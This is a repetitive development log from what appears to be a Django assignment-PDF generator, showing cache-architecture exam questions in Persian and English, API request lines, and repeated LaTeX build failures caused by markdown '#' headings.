+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+hear we are {'is_selected_for_assignment': True} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} [NAME]،
+
+در زیر چند سوال در مورد کش در حافظه وجود دارد:
+
+1. کش چیست و در مدیریت حافظه چه نقشی ایفا می کند؟
+2. انواع مختلف کش ها را توضیح دهید و مثالی از هر کدام ارائه کنید.
+3. معیارهای طراحی یک کش کارآمد چیست؟ مثالی از استراتژی های جایگزینی صفحه ارائه دهید.
+4. اگر یک برنامه به طور مکرر به یک بلوک حافظه خاص مراجعه کند، عملکرد یک سیستم کش چگونه خواهد بود؟
+5. در مورد همگام سازی کش در یک محیط چند پردازشی توضیح دهید. چالش های احتمالی و راهکارهای آن چیست؟
+
+لطفاً پاسخ خود را با جزئیات فنی مناسب ارائه دهید و از نمودارها یا کدهایی که ممکن است مفید باشند استفاده کنید.
+
+با تشکر،
+[NAME]
+Removed: latex/assignment_pdf.aux
+Removed: latex/assignment_pdf.fls
+Removed: latex/assignment_pdf.fdb_latexmk
+Removed: latex/assignment_pdf.log
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+1
+[15/Jun/2024 08:43:20] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:43:25] "PATCH /api/questions/10/ HTTP/1.1" 200 843
+[15/Jun/2024 08:43:26] "GET /api/questions/assignment/4/ HTTP/1.1" 200 2538
+[15/Jun/2024 08:43:39] "OPTIONS /api/images/SAT_Poster.png HTTP/1.1" 200 0
+[15/Jun/2024 08:43:39] "GET /api/images/SAT_Poster.png HTTP/1.1" 301 0
+[15/Jun/2024 08:43:40] "OPTIONS /api/images/SAT_Poster.png/ HTTP/1.1" 200 0
+[15/Jun/2024 08:43:41] "GET /api/images/SAT_Poster.png/ HTTP/1.1" 200 649974
+[15/Jun/2024 08:43:46] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:43:46] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:43:46] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:43:46] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:43:52] "GET /api/questions/assignment/4/ HTTP/1.1" 200 2538
+[15/Jun/2024 08:43:52] "GET /api/questions/assignment/4/ HTTP/1.1" 200 2538
+[15/Jun/2024 08:44:09] "PATCH /api/questions/12/ HTTP/1.1" 200 1158
+[15/Jun/2024 08:44:12] "PATCH /api/questions/12/ HTTP/1.1" 200 1158
+[15/Jun/2024 08:44:43] "POST /api/questions/ HTTP/1.1" 201 680
+[15/Jun/2024 08:44:45] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3220
+[15/Jun/2024 08:44:56] "OPTIONS /api/questions/13/ HTTP/1.1" 200 0
+[15/Jun/2024 08:44:57] "OPTIONS /api/questions/13/ HTTP/1.1" 200 0
+[15/Jun/2024 08:44:57] "PATCH /api/questions/13/ HTTP/1.1" 200 681
+Rc files read:
+  /etc/LatexMk
+Latexmk: This is Latexmk, John Collins, 20 November 2021, version: 4.76.
+Rule 'pdflatex': File changes, etc:
+   Changed files, or newly in use since previous run(s):
+      '/root/Project/Backend/latex/assignment_pdf.tex'
+------------
+Run number 1 of rule 'pdflatex'
+------------
+------------
+Running 'pdflatex  --interaction=nonstopmode -recorder  "/root/Project/Backend/latex/assignment_pdf.tex"'
+------------
+Latexmk: applying rule 'pdflatex'...
+This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex)
+ restricted \write18 enabled.
+entering extended mode
+(/root/Project/Backend/latex/assignment_pdf.tex
+LaTeX2e <2021-11-15> patch level 1
+L3 programming layer <2022-01-21>
+(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2021/10/04 v1.4n Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo))
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty)
+(/usr/share/texmf/tex/latex/lm/lmodern.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/lastpage/lastpage.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
+(/usr/share/texlive/texmf-dist/tex/latex/ragged2e/ragged2e.sty)
+(/usr/share/texmf/tex/latex/lm/t1lmr.fd)
+(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def)
+(./assignment_pdf.aux)
+*geometry* driver: auto-detecting
+*geometry* detected driver: pdftex
+(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+) (/usr/share/texlive/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
+(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
+(/usr/share/texmf/tex/latex/lm/ot1lmr.fd)
+(/usr/share/texmf/tex/latex/lm/omllmm.fd)
+(/usr/share/texmf/tex/latex/lm/omslmsy.fd)
+(/usr/share/texmf/tex/latex/lm/omxlmex.fd)
+! You can't use `macro parameter character #' in vertical mode.
+l.46 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.46 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.48 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.48 ###
+         Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.51 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.51 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.51 ###
+         Part 2: Recommendation for High-Performance Computing
+
+AED: lastpage setting LastPage
+[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map} <./logo.png> <./questiona
+ttachments/SAT_Poster.png>] (./assignment_pdf.aux)
+
+LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.
+
+ )
+(see the transcript file for additional information){/usr/share/texmf/fonts/enc
+/dvips/lm/lm-ec.enc}</usr/share/texmf/fonts/type1/public/lm/lmbx10.pfb></usr/sh
+are/texmf/fonts/type1/public/lm/lmbx12.pfb></usr/share/texmf/fonts/type1/public
+/lm/lmr10.pfb></usr/share/texmf/fonts/type1/public/lm/lmr12.pfb>
+Output written on assignment_pdf.pdf (1 page, 269769 bytes).
+Transcript written on assignment_pdf.log.
+Latexmk: References changed.
+Latexmk: Log file says output to 'assignment_pdf.pdf'
+Collected error summary (may duplicate other messages):
+  pdflatex: Command for 'pdflatex' gave return code 1
+      Refer to 'assignment_pdf.log' for details
+Latexmk: Use the -f option to force complete processing,
+ unless error was exceeding maximum runs, or warnings treated as errors.
+Latexmk: Examining 'assignment_pdf.log'
+=== TeX engine is 'pdfTeX'
+Latexmk: Errors, so I did not complete making targets
+
+An error occurred: Command '['latexmk', '--pdf', '--interaction=nonstopmode', '/root/Project/Backend/latex/assignment_pdf.tex']' returned non-zero exit status 12.
+hear we are <QueryDict: {'details_modified': ['## Cache Performance Analysis and Comparison\r\n\r\n### Part 1: Analysis of Cache Performance\r\nAnalyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. \r\n\r\n### Part 2: Recommendation for High-Performance Computing\r\nPresent your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.'], 'attachment': [<InMemoryUploadedFile: SAT_Poster.png (image/png)>]}> ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+SAT_Poster.png
+/root/Project/Backend/latex/questionattachments/SAT_Poster.png
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+Here is the anonymized and formatted version of the question:
+
+"Please describe the following aspects of FIFO and LIFO caching mechanisms:
+
+1. Provide a brief explanation of what FIFO and LIFO are in the context of cache management.
+2. Discuss the advantages and disadvantages of each approach.
+3. Provide examples of scenarios where each method would be particularly beneficial or detrimental."
+hear we are {'is_selected_for_assignment': False} Here is the anonymized and formatted version of the question:
+
+"Please describe the following aspects of FIFO and LIFO caching mechanisms:
+
+1. Provide a brief explanation of what FIFO and LIFO are in the context of cache management.
+2. Discuss the advantages and disadvantages of each approach.
+3. Provide examples of scenarios where each method would be particularly beneficial or detrimental."
+hear we are {'is_selected_for_assignment': False} [15/Jun/2024 08:44:57] "PATCH /api/questions/13/ HTTP/1.1" 200 681
+[15/Jun/2024 08:45:07] "PATCH /api/questions/13/ HTTP/1.1" 200 681
+[15/Jun/2024 08:46:54] "PATCH /api/questions/13/ HTTP/1.1" 200 831
+[15/Jun/2024 08:47:26] "PATCH /api/questions/13/ HTTP/1.1" 200 894
+[15/Jun/2024 08:47:49] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3459
+[15/Jun/2024 08:47:49] "GET /api/questions/assignment/4/ HTTP/1.1" 200 3459
+[15/Jun/2024 08:47:55] "PATCH /api/questions/13/ HTTP/1.1" 200 831
+[15/Jun/2024 08:48:08] "PATCH /api/questions/11/ HTTP/1.1" 200 483
+[15/Jun/2024 08:48:11] "PATCH /api/questions/10/ HTTP/1.1" 200 844
+[15/Jun/2024 08:48:11] "PATCH /api/questions/10/ HTTP/1.1" 200 844
+[15/Jun/2024 08:48:12] "PATCH /api/questions/10/ HTTP/1.1" 200 844
+[15/Jun/2024 08:48:13] "PATCH /api/questions/11/ HTTP/1.1" 200 483
+[15/Jun/2024 08:48:24] "PATCH /api/questions/10/ HTTP/1.1" 200 844
+[15/Jun/2024 08:50:01] "POST /auth/jwt/create/ HTTP/1.1" 200 483
+[15/Jun/2024 08:50:03] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:50:04] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:50:04] "GET /api/assignments/ HTTP/1.1" 200 592
+[15/Jun/2024 08:50:06] "GET /api/courses/ HTTP/1.1" 200 156
+[15/Jun/2024 08:50:06] "GET /api/questions/sorted/4/ HTTP/1.1" 200 3371
+[15/Jun/2024 08:50:07] "GET /api/questions/sorted/4/ HTTP/1.1" 200 3371
+Here is the anonymized and formatted version of the question:
+
+"Please describe the following aspects of FIFO and LIFO caching mechanisms:
+
+1. Provide a brief explanation of what FIFO and LIFO are in the context of cache management.
+2. Discuss the advantages and disadvantages of each approach.
+3. Provide examples of scenarios where each method would be particularly beneficial or detrimental."
+hear we are {'is_selected_for_assignment': False} Here is the anonymized and formatted version of the question:
+
+"Please describe the following aspects of FIFO and LIFO caching mechanisms:
+
+1. Provide a brief explanation of what FIFO and LIFO are in the context of cache management.
+2. Discuss the advantages and disadvantages of each approach.
+3. Provide examples of scenarios where each method would be particularly beneficial or detrimental."
+hear we are <QueryDict: {'details_modified': ['## Cache Performance Analysis and Comparison\r\n\r\n### Part 1: Analysis of Cache Performance\r\nAnalyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. \r\n\r\n### Part 2: Recommendation for High-Performance Computing\r\nPresent your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.']}> ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are <QueryDict: {'details_modified': ['## Cache Performance Analysis and Comparison\r\n\r\n### Part 1: Analysis of Cache Performance\r\nAnalyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. \r\n\r\n### Part 2: Recommendation for High-Performance Computing\r\nPresent your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.'], 'attachment': [<InMemoryUploadedFile: Screenshot 2024-05-16 at 1.48.01PM.png (image/png)>]}> ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are <QueryDict: {'details_modified': ['## Cache Performance Analysis and Comparison\r\n\r\n### Part 1: Analysis of Cache Performance\r\nAnalyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. \r\n\r\n### Part 2: Recommendation for High-Performance Computing\r\nPresent your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.']}> ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': True} [Question]
+
+---
+
+## Part 1: 
+
+Remove personally identifiable information and format the question. 
+
+## Part 2: 
+
+Please provide the anonymized and formatted question below: 
+
+"A new and improved test question is presented for your attention."
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': True} [Question]
+
+---
+
+## Part 1: 
+
+Remove personally identifiable information and format the question. 
+
+## Part 2: 
+
+Please provide the anonymized and formatted question below: 
+
+"A new and improved test question is presented for your attention."
+hear we are {'is_selected_for_assignment': False} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+Removed: latex/assignment_pdf.aux
+Removed: latex/assignment_pdf.fls
+Removed: latex/assignment_pdf.fdb_latexmk
+Removed: latex/assignment_pdf.log
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+1
+[15/Jun/2024 08:50:17] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:50:22] "PATCH /api/questions/13/ HTTP/1.1" 200 830
+Rc files read:
+  /etc/LatexMk
+Latexmk: This is Latexmk, John Collins, 20 November 2021, version: 4.76.
+Rule 'pdflatex': File changes, etc:
+   Changed files, or newly in use since previous run(s):
+      '/root/Project/Backend/latex/assignment_pdf.tex'
+------------
+Run number 1 of rule 'pdflatex'
+------------
+------------
+Running 'pdflatex  --interaction=nonstopmode -recorder  "/root/Project/Backend/latex/assignment_pdf.tex"'
+------------
+Latexmk: applying rule 'pdflatex'...
+This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex)
+ restricted \write18 enabled.
+entering extended mode
+(/root/Project/Backend/latex/assignment_pdf.tex
+LaTeX2e <2021-11-15> patch level 1
+L3 programming layer <2022-01-21>
+(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2021/10/04 v1.4n Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo))
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty)
+(/usr/share/texmf/tex/latex/lm/lmodern.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/lastpage/lastpage.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
+(/usr/share/texlive/texmf-dist/tex/latex/ragged2e/ragged2e.sty)
+(/usr/share/texmf/tex/latex/lm/t1lmr.fd)
+(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def)
+(./assignment_pdf.aux)
+*geometry* driver: auto-detecting
+*geometry* detected driver: pdftex
+(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+) (/usr/share/texlive/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
+(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
+(/usr/share/texmf/tex/latex/lm/ot1lmr.fd)
+(/usr/share/texmf/tex/latex/lm/omllmm.fd)
+(/usr/share/texmf/tex/latex/lm/omslmsy.fd)
+(/usr/share/texmf/tex/latex/lm/omxlmex.fd)
+! You can't use `macro parameter character #' in vertical mode.
+l.50 #
+      # Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.50 ##
+        Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.54 #
+      # Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.54 ##
+        Part 2:
+
+AED: lastpage setting LastPage
+[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map} <./logo.png>]
+(./assignment_pdf.aux)
+
+LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.
+
+ )
+(see the transcript file for additional information){/usr/share/texmf/fonts/enc
+/dvips/lm/lm-ec.enc}</usr/share/texmf/fonts/type1/public/lm/lmbx10.pfb></usr/sh
+are/texmf/fonts/type1/public/lm/lmbx12.pfb></usr/share/texmf/fonts/type1/public
+/lm/lmr10.pfb></usr/share/texmf/fonts/type1/public/lm/lmr12.pfb>
+Output written on assignment_pdf.pdf (1 page, 110274 bytes).
+Transcript written on assignment_pdf.log.
+Latexmk: References changed.
+Latexmk: Log file says output to 'assignment_pdf.pdf'
+Collected error summary (may duplicate other messages):
+  pdflatex: Command for 'pdflatex' gave return code 1
+      Refer to 'assignment_pdf.log' for details
+Latexmk: Use the -f option to force complete processing,
+ unless error was exceeding maximum runs, or warnings treated as errors.
+Latexmk: Examining 'assignment_pdf.log'
+=== TeX engine is 'pdfTeX'
+Latexmk: Errors, so I did not complete making targets
+
+An error occurred: Command '['latexmk', '--pdf', '--interaction=nonstopmode', '/root/Project/Backend/latex/assignment_pdf.tex']' returned non-zero exit status 12.
+hear we are {'is_selected_for_assignment': True} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+Removed: latex/assignment_pdf.aux
+Removed: latex/assignment_pdf.fls
+Removed: latex/assignment_pdf.fdb_latexmk
+Removed: latex/assignment_pdf.log
+Removed: latex/assignment_pdf.pdf
+Removed: latex/assignment_pdf.tex
+All files in the latex folder have been removed successfully.
+2
+[15/Jun/2024 08:50:31] "POST /generate_pdf/ HTTP/1.1" 200 41
+[15/Jun/2024 08:50:40] "PATCH /api/questions/12/ HTTP/1.1" 200 1157
+[15/Jun/2024 08:50:47] "PATCH /api/questions/10/ HTTP/1.1" 200 843
+Rc files read:
+  /etc/LatexMk
+Latexmk: This is Latexmk, John Collins, 20 November 2021, version: 4.76.
+Rule 'pdflatex': File changes, etc:
+   Changed files, or newly in use since previous run(s):
+      '/root/Project/Backend/latex/assignment_pdf.tex'
+------------
+Run number 1 of rule 'pdflatex'
+------------
+------------
+Running 'pdflatex  --interaction=nonstopmode -recorder  "/root/Project/Backend/latex/assignment_pdf.tex"'
+------------
+Latexmk: applying rule 'pdflatex'...
+This is pdfTeX, Version 3.141592653-2.6-1.40.22 (TeX Live 2022/dev/Debian) (preloaded format=pdflatex)
+ restricted \write18 enabled.
+entering extended mode
+(/root/Project/Backend/latex/assignment_pdf.tex
+LaTeX2e <2021-11-15> patch level 1
+L3 programming layer <2022-01-21>
+(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2021/10/04 v1.4n Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/size10.clo))
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/inputenc.sty)
+(/usr/share/texmf/tex/latex/lm/lmodern.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/base/textcomp.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/lastpage/lastpage.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
+(/usr/share/texlive/texmf-dist/tex/latex/ragged2e/ragged2e.sty)
+(/usr/share/texmf/tex/latex/lm/t1lmr.fd)
+(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def)
+(./assignment_pdf.aux)
+*geometry* driver: auto-detecting
+*geometry* detected driver: pdftex
+(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+) (/usr/share/texlive/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
+(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
+(/usr/share/texmf/tex/latex/lm/ot1lmr.fd)
+(/usr/share/texmf/tex/latex/lm/omllmm.fd)
+(/usr/share/texmf/tex/latex/lm/omslmsy.fd)
+(/usr/share/texmf/tex/latex/lm/omxlmex.fd)
+! You can't use `macro parameter character #' in vertical mode.
+l.50 #
+      # Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.50 ##
+        Part 1:
+! You can't use `macro parameter character #' in vertical mode.
+l.54 #
+      # Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.54 ##
+        Part 2:
+! You can't use `macro parameter character #' in vertical mode.
+l.63 #
+      # Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.63 ##
+        Cache Performance Analysis and Comparison
+! You can't use `macro parameter character #' in vertical mode.
+l.65 #
+      ## Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.65 ##
+       # Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.65 ###
+         Part 1: Analysis of Cache Performance
+! You can't use `macro parameter character #' in vertical mode.
+l.68 #
+      ## Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.68 ##
+       # Part 2: Recommendation for High-Performance Computing
+! You can't use `macro parameter character #' in vertical mode.
+l.68 ###
+         Part 2: Recommendation for High-Performance Computing
+
+AED: lastpage setting LastPage
+[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map} <./logo.png>]
+(./assignment_pdf.aux)
+
+LaTeX Warning: Label(s) may have changed. Rerun to get cross-references right.
+
+ )
+(see the transcript file for additional information){/usr/share/texmf/fonts/enc
+/dvips/lm/lm-ec.enc}</usr/share/texmf/fonts/type1/public/lm/lmbx10.pfb></usr/sh
+are/texmf/fonts/type1/public/lm/lmbx12.pfb></usr/share/texmf/fonts/type1/public
+/lm/lmr10.pfb></usr/share/texmf/fonts/type1/public/lm/lmr12.pfb>
+Output written on assignment_pdf.pdf (1 page, 113285 bytes).
+Transcript written on assignment_pdf.log.
+Latexmk: References changed.
+Latexmk: Log file says output to 'assignment_pdf.pdf'
+Collected error summary (may duplicate other messages):
+  pdflatex: Command for 'pdflatex' gave return code 1
+      Refer to 'assignment_pdf.log' for details
+Latexmk: Use the -f option to force complete processing,
+ unless error was exceeding maximum runs, or warnings treated as errors.
+Latexmk: Examining 'assignment_pdf.log'
+=== TeX engine is 'pdfTeX'
+Latexmk: Errors, so I did not complete making targets
+
+An error occurred: Command '['latexmk', '--pdf', '--interaction=nonstopmode', '/root/Project/Backend/latex/assignment_pdf.tex']' returned non-zero exit status 12.
+hear we are {'is_selected_for_assignment': True} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
+Analyze and compare the performance of direct-mapped and fully associative caches. Consider parameters such as hit rate, miss rate, and average access time in your analysis. 
+
+### Part 2: Recommendation for High-Performance Computing
+Present your findings from Part 1 and explain which cache organization you would recommend for a system with an emphasis on high-performance computing. Be sure to justify your choice based on the analysis results.
+hear we are {'is_selected_for_assignment': True} ## Cache Performance Analysis and Comparison
+
+### Part 1: Analysis of Cache Performance
